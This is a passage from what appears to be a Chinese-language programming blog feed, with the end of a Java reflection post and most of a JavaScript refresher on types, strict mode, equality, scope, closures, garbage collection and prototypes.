class="token operator">:</span> types<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 测试参数类型     *     * @throws NoSuchMethodException     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testParamType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> testMethod <span class="token operator">=</span> <span class="token class-name">Client</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterTypes <span class="token operator">=</span> testMethod<span class="token punctuation">.</span><span class="token function">getGenericParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Type</span> type <span class="token operator">:</span> parameterTypes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"type -> "</span> <span class="token operator">+</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span> actualTypes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getActualTypeArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Type</span> actualType <span class="token operator">:</span> actualTypes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\tactual type -> "</span> <span class="token operator">+</span> actualType<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 测试返回值类型     *     * @throws NoSuchMethodException     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> testMethod <span class="token operator">=</span> <span class="token class-name">Client</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Type</span> returnType <span class="token operator">=</span> testMethod<span class="token punctuation">.</span><span class="token function">getGenericReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"return type -> "</span> <span class="token operator">+</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>returnType <span class="token keyword">instanceof</span> <span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span> actualTypes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> returnType<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getActualTypeArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Type</span> actualType <span class="token operator">:</span> actualTypes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\tactual type -> "</span> <span class="token operator">+</span> actualType<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>参考文档：<a href="http://www.sczyh30.com/posts/Java/java-reflection-1/">Java反射基础</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript之再学习</title>
      <link href="/2018/10/30/javascript/javascript-zhi-zai-xue-xi/"/>
      <url>/2018/10/30/javascript/javascript-zhi-zai-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>JavaScript 是一种面向对象的动态语言，它包含类型、运算符、标准内置（ built-in）对象和方法。它的语法来源于 Java 和 C，所以这两种语言的许多语法特性同样适用于 JavaScript。需要注意的一个主要区别是 JavaScript 不支持类，类这一概念在 JavaScript 通过对象原型（object prototype）得到延续。另一个主要区别是 JavaScript 中的函数也是对象，JavaScript 允许函数在包含可执行代码的同时，能像其他对象一样被传递。</p><h2 id="数据类型和结构"><a href="#数据类型和结构" class="headerlink" title="数据类型和结构"></a>数据类型和结构</h2><h3 id="1-动态类型"><a href="#1-动态类型" class="headerlink" title="1. 动态类型"></a>1. 动态类型</h3><p><code>JavaScript</code>是一种弱类型或者说动态语言。这意味着你不用提前声明变量的类型，在程序运行过程中，类型会被自动确定。这也意味着你可以使用同一个变量保存不同类型的数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>    <span class="token comment">// foo is a Number now</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token string">"bar"</span><span class="token punctuation">;</span> <span class="token comment">// foo is a String now</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment">// foo is a Boolean now</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h3><p>最新的<code>ECMAScript</code>标准定义了 7 种数据类型:</p><ul><li>6 种原始类型<ul><li><code>Null</code> (空, 只有一个值<code>null</code>)</li><li><code>Undefined</code> (未定义, 一个没有被赋值的变量的默认值是<code>undefined</code>):</li><li><code>Boolean</code> (布尔, 可以有两个值：<code>true</code> 和 <code>false</code>)</li><li><code>Number</code> (数字)</li><li><code>String</code> (字符串)</li><li><code>Symbol</code> (符号, ECMAScript 6 新定义的类型，表示独一无二的值)</li></ul></li><li>和 <code>Object</code> (对象)<ul><li><code>Function</code> (函数)</li><li><code>Array</code> (数组)</li><li><code>Date</code> (日期)</li><li><code>JSON</code> (JS对象标识,来序列化对象、数组、数值、字符串、布尔值和 <code>null</code>)</li><li><code>Math</code> (数学方面的计算)</li><li><code>RegExp</code> (正则表达式)</li><li><code>Error</code> (错误)</li><li><code>Map</code></li><li><code>Set</code></li></ul></li></ul><h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><p>这里的<strong>内置对象</strong>指的是在全局作用域(<code>global scope</code>)中的对象，由于很多，不再一一列出说明，更全面的解释在<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects">这里</a>。</p><p>全局对象本身可通过<code>this</code>操作符在全局作用域中获得。实际上，全局作用域就是由全局对象的各个属性组成的（包括继承来的属性）。</p><h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>除了正常运行模式，ECMAscript 5添加了第二种运行模式：”严格模式”（<code>strict mode</code>）。顾名思义，这种模式使得Javascript在更严格的条件下运行。</p><p>严格模式可以应用到整个script标签或个别函数中。设立”严格模式”的目的，主要有以下几个：</p><ul><li>消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为;</li><li>消除代码运行的一些不安全之处，保证代码运行的安全；</li><li>提高编译器效率，增加运行速度；</li><li>为未来新版本的 Javascript 做好铺垫。</li></ul><h3 id="为某个script标签开启严格模式"><a href="#为某个script标签开启严格模式" class="headerlink" title="为某个script标签开启严格模式"></a>为某个script标签开启严格模式</h3><p>进入严格模式的标志，是下面这行语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="为某个函数开启严格模式"><a href="#为某个函数开启严格模式" class="headerlink" title="为某个函数开启严格模式"></a>为某个函数开启严格模式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">strict</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 函数级别严格模式语法</span>  <span class="token string">'use strict'</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token string">"I'm a strict mode function!  "</span> <span class="token operator">+</span> <span class="token function">nested</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">notStrict</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"I'm not strict."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相等性判断"><a href="#相等性判断" class="headerlink" title="相等性判断"></a>相等性判断</h2><p>JavaScript提供三种不同的值比较操作：</p><ul><li>严格相等 (“triple equals” 或 “identity”)，使用<code>===</code></li><li>宽松相等 (“double equals”) ，使用<code>==</code></li><li>以及<code>Object.is</code> (ECMAScript 2015/ ES6 新特性)</li></ul><p>简而言之，在比较两件事情时，双等号将执行类型转换; 三等号将进行相同的比较，而不进行类型转换 (如果类型不同, 只是总会返回 false );  而<code>Object.is</code>的行为方式与三等号相同，但是对于NaN和-0和+0进行特殊处理，所以最后两个不相同，而<code>Object.is(NaN，NaN)</code>将为 true。</p><p><img src="https://statics.sh1a.qingstor.com/2020/11/27/js_equals.png" alt="各原始类型值的相等比较对照表"></p><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。在JavaScript中，变量的作用域有<strong>全局作用域</strong>和<strong>局部作用域</strong>两种。</p><h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>在代码中任何地方都能访问到的对象拥有全局作用域。一般来说以下几种情形：</p><ul><li>最外层函数和在最外层函数外面定义的变量拥有全局作用域。</li><li>所有未定义而直接赋值的变量自动声明为拥有全局作用域。</li><li>所有window对象的属性拥有全局作用域。如：<code>window.name</code>、<code>window.location</code>等。</li></ul><blockquote><p><strong>注</strong>：全局变量存在于程序的整个生命周期。没有块级作用域。</p></blockquote><h3 id="局部作用域"><a href="#局部作用域" class="headerlink" title="局部作用域"></a>局部作用域</h3><p>局部作用域一般只在固定的代码片段内可访问到，最常见的是在函数内部，所有在一些地方也会看到有人把这种作用域称为<strong>函数作用域</strong>。</p><h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><p>JavaScript里一切都是对象。函数对象和其它对象一样，拥有可以通过代码访问的属性和一系列仅供JavaScript引擎访问的内部属性。其中一个内部属性是<code>Scope</code>，该内部属性包含了函数被创建的作用域中对象的集合，这个集合被称为函数的作用域链，它决定了哪些数据能被函数访问。</p><p>因为全局变量总是存在于<strong>运行时上下文</strong>作用域链的最末端。所以，在标识符解析的时候，查找全局变量是最慢的。所以，在编写代码的时候应尽量少使用全局变量，尽可能使用局部变量。一个好的经验法则是：<strong>如果一个跨作用域的对象被引用了一次以上，则先把它存储到局部变量里再使用</strong>。</p><p><code>with</code>语句主要用来临时扩展作用域链，将语句中的对象添加到作用域的头部。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">person <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"yhb"</span><span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token literal-property property">height</span><span class="token operator">:</span><span class="token number">175</span><span class="token punctuation">,</span> <span class="token literal-property property">wife</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">"lwy"</span><span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">21</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">with</span> <span class="token punctuation">(</span>person<span class="token punctuation">.</span>wife<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>with语句将<code>person.wife</code>添加到当前作用域链的头部，所以输出的就是：<code>lwy</code>；with语句结束后，作用域链恢复正常。</p><blockquote><p>当代码运行到with语句时，运行期上下文的作用域链临时被改变了。一个新的可变对象被创建，它包含了参数指定的对象的所有属性。这个对象将被推入作用域链的头部，这意味着函数的所有局部变量现在处于第二个作用域链对象中，因此访问代价更高了。<br><strong>注</strong>：在程序中应避免使用with语句。</p></blockquote><h2 id="闭包-Closures"><a href="#闭包-Closures" class="headerlink" title="闭包(Closures)"></a>闭包(Closures)</h2><h3 id="一个示例"><a href="#一个示例" class="headerlink" title="一个示例"></a>一个示例</h3><p>如何从外部读取局部变量？</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> n<span class="token operator">=</span><span class="token number">999</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的代码中，函数f2就被包括在函数f1内部，这时f1内部的所有局部变量，对f2都是可见的。但是反过来就不行，f2内部的局部变量，对f1就是不可见的。这就是Javascript语言特有的”链式作用域”结构（<code>chain scope</code>），子对象会一级一级地向上寻找所有父对象的变量。所以，<strong>父对象的所有变量，对子对象都是可见的，反之则不成立</strong>。</p><p>既然f2可以读取f1中的局部变量，那么只要把f2作为返回值，我们不就可以在f1外部读取它的内部变量了吗！</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> n<span class="token operator">=</span><span class="token number">999</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> f2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> result<span class="token operator">=</span><span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="闭包解释"><a href="#闭包解释" class="headerlink" title="闭包解释"></a>闭包解释</h3><blockquote><p><strong>闭包定义</strong>：闭包是一个函数和函数所声明的词法环境的结合。</p></blockquote><p>在上面的代码中，f2函数就是闭包。<strong>闭包</strong>（<code>closure</code>）定义非常抽象，很难看懂。我的理解是，<strong>闭包就是能够读取其他函数内部变量的函数</strong>。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p><p>闭包最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中，不会在调用结束后被垃圾回收机制（<code>garbage collection</code>）回收。</p><h3 id="立即执行函数表达式"><a href="#立即执行函数表达式" class="headerlink" title="立即执行函数表达式"></a>立即执行函数表达式</h3><p>有时你想模拟一个模拟块级作用域，例如你想将变量从全局作用域隔离。完成这个工作的模式叫做<code>IIFE</code>(立即执行函数表达式(<code>Immediately Invoked Function Expression</code>))：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 块开始</span>    <span class="token keyword">var</span> tmp <span class="token operator">=</span> <span class="token operator">...</span><span class="token punctuation">;</span>  <span class="token comment">// 非全局变量</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 块结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="用闭包模拟私有方法"><a href="#用闭包模拟私有方法" class="headerlink" title="用闭包模拟私有方法"></a>用闭包模拟私有方法</h3><p>JavaScript 并不提供原生的支持私有方法，但是可以使用闭包模拟私有方法。私有方法不仅仅有利于限制对代码的访问：还提供了管理全局命名空间的强大能力，避免非核心的方法弄乱了代码的公共接口部分。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Counter <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> privateCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">changeBy</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        privateCounter <span class="token operator">+=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token function-variable function">increment</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">changeBy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function-variable function">decrement</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">changeBy</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token function-variable function">value</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> privateCounter<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Counter<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* logs 0 */</span>Counter<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Counter<span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Counter<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* logs 2 */</span>Counter<span class="token punctuation">.</span><span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Counter<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* logs 1 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面创建了一个环境，为三个函数所共享：<code>Counter.increment</code>, <code>Counter.decrement</code>和<code>Counter.value</code>。该共享环境创建于一个匿名函数体内，该函数一经定义立刻执行。环境中包含两个私有项：名为<code>privateCounter</code>的变量和名为<code>changeBy</code>的函数。这两项都无法在匿名函数外部直接访问。必须通过匿名包装器返回的三个公共函数访问。</p><p><strong>注意</strong>：</p><ul><li>由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。解决方法是，在退出函数之前，将不使用的局部变量全部删除。</li><li>闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。</li></ul><h2 id="内存机制"><a href="#内存机制" class="headerlink" title="内存机制"></a>内存机制</h2><p>首先JavaScript中的变量分为<strong>基本类型</strong>和<strong>引用类型</strong>。</p><ul><li>基本类型就是保存在栈内存中的简单数据段。基本类型有<code>Undefined</code>、<code>Null</code>、<code>Boolean</code>、<code>Number</code>和<code>String</code>。这些类型在内存中分别占有固定大小的空间，他们的值保存在<strong>栈空间</strong>，我们通过按值来访问的。</li><li>引用类型指的是那些保存在堆内存中的对象。引用类型，值大小不固定，栈内存中存放地址指向堆内存中的对象。是按引用访问的。栈内存中存放的只是该对象的访问地址，在堆内存中为这个值分配空间。</li></ul><h3 id="为什么会有栈内存和堆内存之分？"><a href="#为什么会有栈内存和堆内存之分？" class="headerlink" title="为什么会有栈内存和堆内存之分？"></a>为什么会有栈内存和堆内存之分？</h3><p>与垃圾回收机制有关，为了使程序运行时占用的内存最小。</p><p>当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；</p><p>当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。</p><h3 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h3><p>Javascript具有自动垃圾回收机制(<code>GC</code>:<code>Garbage Collecation</code>)，也就是说，执行环境会负责管理代码执行过程中使用的内存。</p><p>JavaScript垃圾回收的机制很简单：<strong>找出不再使用的变量，然后释放掉其占用的内存，但是这个过程不是实时的，因为其开销比较大，所以垃圾回收器会按照固定的时间间隔周期性的执行</strong>。</p><p>不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。</p><h4 id="清除方式"><a href="#清除方式" class="headerlink" title="清除方式"></a>清除方式</h4><ul><li><strong>标记清除</strong>：垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。</li><li><strong>引用计数</strong>：引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。</li></ul><h2 id="原型-prototype"><a href="#原型-prototype" class="headerlink" title="原型(prototype)"></a>原型(prototype)</h2><p>原型是一个对象，其他对象可以通过它实现属性继承。JavaScript的对象中都包含了一个<code>Prototype</code>内部属性，这个属性所对应的就是该对象的原型。<code>Prototype</code>作为对象的内部属性，是不能被直接访问的。所以为了方便查看一个对象的原型，Firefox和Chrome中提供了<code>__proto__</code>这个非标准的访问器。</p><ul><li>所有的对象都有<code>__proto__</code>属性，该属性对应着该对象的原型。</li><li>所有的函数对象都有<code>prototype</code>属性，该属性的值会被赋值给该函数创建的对象的<code>__proto__</code>属性</li><li>所有的原型对象都有<code>constructor</code>属性，该属性对应创建所有指向该原型的实例的构造函数</li><li>函数对象和原型对象通过<code>prototype</code>和<code>constructor</code>属性进行相互关联</li><li><code>Object</code>实例对象的原型<code>obj.__proto__</code>就是<code>Object.prototype</code></li><li><code>hasOwnProperty</code>是<code>Object.prototype</code>的一个方法，该方法能判断一个对象是否包含自定义属性而不是原型链上的属性，因为”hasOwnProperty” 是 JavaScript 中唯一一个处理属性但是不查找原型链的函数</li></ul><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>因为每个对象和原型都有原型，对象的原型指向对象的父，而父的原型又指向父的父，这种原型层层连接起来的就构成了原型链。</p><p>当通过原型链查找一个属性的时候，首先查找的是对象本身的属性，如果找不到才会继续按照原型链进行查找。这样一来，如果想要覆盖原型链上的一些属性，我们就可以直接在对象中引入这些属性，达到属性隐藏的效果。</p><h2 id="对象创建方式"><a href="#对象创建方式" class="headerlink" title="对象创建方式"></a>对象创建方式</h2><h3 id="1-Object构造函数方式"><a href="#1-Object构造函数方式" class="headerlink" title="1. Object构造函数方式"></a>1. Object构造函数方式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Nike'</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span><span aria-hidden="true" 